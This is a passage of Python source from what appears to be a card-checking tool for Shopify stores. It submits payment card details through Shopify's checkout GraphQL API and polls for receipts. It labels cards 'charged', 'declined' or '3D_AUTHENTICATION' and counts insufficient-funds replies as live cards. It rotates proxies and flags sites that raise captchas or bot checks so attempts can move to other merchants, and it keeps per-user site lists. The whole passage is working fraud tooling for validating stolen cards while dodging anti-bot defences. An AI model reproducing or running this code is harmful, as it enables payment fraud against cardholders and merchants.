                        'operationName': 'SubmitForCompletion'
                    }, 
                    headers=headers, 
                    proxy=proxy
                )
                
                result_text = await submit_resp.text()
                logger.info(f"[Gate4] Submit response received")
                
                # Parse response
                try:
                    submit_data = json.loads(result_text)
                    submit_result = submit_data.get('data', {}).get('submitForCompletion', {})
                    typename = submit_result.get('__typename', '')
                    logger.info(f"[Gate4] Submit typename: {typename}")
                    
                    if typename == 'SubmitFailed':
                        reason = submit_result.get('reason', 'Unknown')
                        return {
                            "status": "declined", 
                            "message": f"Submit Failed: {reason}", 
                            "site": site, 
                            "raw": reason, 
                            "amount": amount, 
                            "proxy": proxy_used
                        }
                    
                    if typename == 'SubmitRejected':
                        errors = submit_result.get('errors', [])
                        error_msgs = [e.get('code', '') or e.get('localizedMessage', '') for e in errors]
                        return {
                            "status": "declined", 
                            "message": f"Rejected: {', '.join(error_msgs)}", 
                            "site": site, 
                            "raw": str(errors), 
                            "amount": amount, 
                            "proxy": proxy_used
                        }
                    
                    if typename == 'SubmittedForCompletion':
                        receipt = submit_result.get('receipt', {})
                        receipt_type = receipt.get('__typename', '')
                        receipt_id = receipt.get('id')
                        logger.info(f"[Gate4] SubmittedForCompletion receipt_type: {receipt_type}")
                        
                        if receipt_type in ['ProcessingReceipt', 'WaitingReceipt'] and receipt_id:
                            pass  # Continue to poll
                        else:
                            return {
                                "status": "unknown", 
                                "message": "Processing pending", 
                                "site": site, 
                                "raw": "SubmittedForCompletion", 
                                "amount": amount, 
                                "proxy": proxy_used
                            }
                    
                    receipt = submit_result.get('receipt', {})
                    receipt_type = receipt.get('__typename', '')
                    receipt_id = receipt.get('id')
                    logger.info(f"[Gate4] Receipt type: {receipt_type}, id: {receipt_id}")
                    
                    if receipt_type == 'ProcessedReceipt':
                        return {
                            "status": "charged", 
                            "message": "Card Charged!", 
                            "site": site, 
                            "raw": "ProcessedReceipt", 
                            "amount": amount, 
                            "proxy": proxy_used
                        }
                    
                    if receipt_type == 'FailedReceipt':
                        error = receipt.get('processingError', {})
                        if error.get('__typename') == 'PaymentFailed':
                            code = error.get('code', 'UNKNOWN')
                            msg = error.get('messageUntranslated', '')
                            
                            # Check for captcha errors
                            error_lower = (code + msg).lower()
                            if any(x in error_lower for x in ['captcha', 'bot', 'verification', 'security']):
                                logger.warning(f"[Gate4] Captcha required in response: {code}")
                                self.mark_captcha_site(site)
                                return {
                                    "status": "error", 
                                    "message": "Captcha required", 
                                    "site": site, 
                                    "retry_site": True, 
                                    "proxy": proxy_used
                                }
                            
                            return {
                                "status": "declined", 
                                "message": f"{code}", 
                                "site": site, 
                                "raw": f"{code}: {msg}", 
                                "amount": amount, 
                                "proxy": proxy_used
                            }
                        
                        return {
                            "status": "declined", 
                            "message": "Payment Failed", 
                            "site": site, 
                            "raw": "FailedReceipt", 
                            "amount": amount, 
                            "proxy": proxy_used
                        }
                    
                    # Poll for receipt if needed
                    if receipt_type in ['ProcessingReceipt', 'WaitingReceipt'] or (receipt_id and not receipt_type):
                        poll_query = '''query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated}}}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id action{__typename}}}}'''
                        
                        for poll_attempt in range(8):
                            await asyncio.sleep(2)
                            poll_resp = await session.post(
                                graphql_url, 
                                json={
                                    'query': poll_query,
                                    'variables': {'receiptId': receipt_id, 'sessionToken': sst},
                                    'operationName': 'PollForReceipt'
                                }, 
                                headers=headers, 
                                proxy=proxy
                            )
                            
                            poll_text = await poll_resp.text()
                            
                            try:
                                poll_data = json.loads(poll_text)
                                poll_receipt = poll_data.get('data', {}).get('receipt', {})
                                poll_type = poll_receipt.get('__typename', '')
                                logger.info(f"[Gate4] Poll {poll_attempt+1}: {poll_type}")
                                
                                if poll_type == 'ProcessedReceipt':
                                    return {
                                        "status": "charged", 
                                        "message": "Card Charged!", 
                                        "site": site, 
                                        "raw": "ProcessedReceipt", 
                                        "amount": amount, 
                                        "proxy": proxy_used
                                    }
                                
                                if poll_type == 'FailedReceipt':
                                    error = poll_receipt.get('processingError', {})
                                    if error.get('__typename') == 'PaymentFailed':
                                        code = error.get('code', 'UNKNOWN')
                                        msg = error.get('messageUntranslated', '')
                                        
                                        if any(x in (code + msg).lower() for x in ['captcha', 'bot', 'verification']):
                                            logger.warning(f"[Gate4] Captcha detected in poll: {code}")
                                            self.mark_captcha_site(site)
                                            return {
                                                "status": "error", 
                                                "message": "Captcha required", 
                                                "site": site, 
                                                "retry_site": True, 
                                                "proxy": proxy_used
                                            }
                                        
                                        return {
                                            "status": "declined", 
                                            "message": f"{code}", 
                                            "site": site, 
                                            "raw": f"{code}: {msg}", 
                                            "amount": amount, 
                                            "proxy": proxy_used
                                        }
                                    
                                    return {
                                        "status": "declined", 
                                        "message": "Payment Failed", 
                                        "site": site, 
                                        "raw": "FailedReceipt", 
                                        "amount": amount, 
                                        "proxy": proxy_used
                                    }
                                
                                if poll_type == 'ActionRequiredReceipt':
                                    action = poll_receipt.get('action', {})
                                    action_type = action.get('__typename', '') if isinstance(action, dict) else ''
                                    action_str = str(action).lower()
                                    
                                    if any(x in action_str for x in ['captcha', 'verification', 'bot']):
                                        logger.warning(f"[Gate4] Captcha action required")
                                        self.mark_captcha_site(site)
                                        return {
                                            "status": "error", 
                                            "message": "Captcha required", 
                                            "site": site, 
                                            "retry_site": True, 
                                            "proxy": proxy_used
                                        }
                                    
                                    if any(x in action_str for x in ['3d', 'authentication', 'redirect', 'challenge']):
                                        return {
                                            "status": "approved", 
                                            "message": "3D_AUTHENTICATION", 
                                            "site": site, 
                                            "raw": "3DS Required", 
                                            "amount": amount, 
                                            "proxy": proxy_used
                                        }
                                    
                                    return {
                                        "status": "approved", 
                                        "message": "3D_AUTHENTICATION", 
                                        "site": site, 
                                        "raw": f"ActionRequired: {action_type}", 
                                        "amount": amount, 
                                        "proxy": proxy_used
                                    }
                                
                                if poll_type not in ['ProcessingReceipt', 'WaitingReceipt']:
                                    break
                            except:
                                continue
                        
                        return {
                            "status": "unknown", 
                            "message": "Timeout waiting for result", 
                            "site": site, 
                            "raw": "Timeout", 
                            "amount": amount, 
                            "proxy": proxy_used
                        }
                
                except json.JSONDecodeError:
                    pass
                
                # Fallback text analysis
                result_lower = result_text.lower()
                
                if any(x in result_lower for x in ['decline', 'denied', 'reject', 'invalid', 'failed']):
                    return {
                        "status": "declined", 
                        "message": "Card Declined", 
                        "site": site, 
                        "raw": result_text[:200], 
                        "amount": amount, 
                        "proxy": proxy_used
                    }
                
                if any(x in result_lower for x in ['insufficient', 'fund', 'balance']):
                    return {
                        "status": "charged", 
                        "message": "CCN - Insufficient Funds", 
                        "site": site, 
                        "raw": "Insufficient", 
                        "amount": amount, 
                        "proxy": proxy_used
                    }
                
                if any(x in result_lower for x in ['success', 'charged', 'processed', 'complete']):
                    return {
                        "status": "charged", 
                        "message": "Card Charged!", 
                        "site": site, 
                        "raw": "Success", 
                        "amount": amount, 
                        "proxy": proxy_used
                    }
                
                if 'error' in result_lower or 'exception' in result_lower:
                    return {
                        "status": "error", 
                        "message": "Error occurred", 
                        "site": site, 
                        "retry_site": True
                    }
                
                return {
                    "status": "unknown", 
                    "message": "Unknown response", 
                    "site": site, 
                    "raw": result_text[:200], 
                    "amount": amount, 
                    "proxy": proxy_used
                }
                
        except asyncio.TimeoutError:
            return {"status": "error", "message": "Timeout", "site": site, "retry_site": True}
        except Exception as e:
            logger.warning(f"[Gate4] Exception on {site}: {str(e)[:100]}")
            return {"status": "error", "message": str(e)[:100], "site": site, "retry_site": True}


def load_proxies():
    proxies = []
    try:
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        # Handle different proxy formats
                        if ':' in line and '@' not in line:
                            parts = line.split(':')
                            if len(parts) == 4:  # ip:port:user:pass
                                proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                            elif len(parts) == 2:  # ip:port
                                proxy = f"http://{line}"
                            else:
                                proxy = line
                        elif not line.startswith('http'):
                            proxy = f"http://{line}"
                        else:
                            proxy = line
                        
                        proxies.append(proxy)
    except Exception as e:
        print(f"Error loading proxies: {e}")
    return proxies


# Initialize the processor
shopify_processor = ShopifyProcessor(proxies=load_proxies())


async def check_card_shopify(cc, mes, ano, cvv, user_id=None, use_user_sites=False):
    """Main function to check card on Shopify"""
    return await shopify_processor.process_card(cc, mes, ano, cvv, user_id, use_user_sites)


async def check_site_shopify(site):
    """Check if a Shopify site is working"""
    return await shopify_processor.check_site(site)


async def check_all_sites_shopify(callback=None):
    """Check all sites in the list"""
    return await shopify_processor.check_all_sites(callback)


def add_site(site, user_id=None, is_bot_site=True):
    """Add a site to the list"""
    if is_bot_site:
        return shopify_processor.add_bot_site(site)
    else:
        return shopify_processor.add_user_site(user_id, site)


def remove_site(site, user_id=None, is_bot_site=True):
    """Remove a site from the list"""
    if is_bot_site:
        return shopify_processor.remove_bot_site(site)
    else:
        return shopify_processor.remove_user_site(user_id, site)


def get_sites(user_id=None, bot_sites=True):
    """Get sites list"""
    if bot_sites:
        return shopify_processor.get_all_bot_sites()
    else:
        return shopify_processor.get_user_sites(user_id)


def add_sites_from_file(filepath):
    """Add sites from a file"""
    added = 0
    try:
        with open(filepath, 'r') as f:
            for line in f:
                site = line.strip()
                if site and shopify_processor.add_bot_site(site):
                    added += 1
    except Exception as e:
        print(f"Error adding sites from file: {e}")
    return added


def clear_captcha_cache():
    """Clear captcha blocked sites cache"""
    shopify_processor.clear_captcha_cache()
    return "Captcha cache cleared"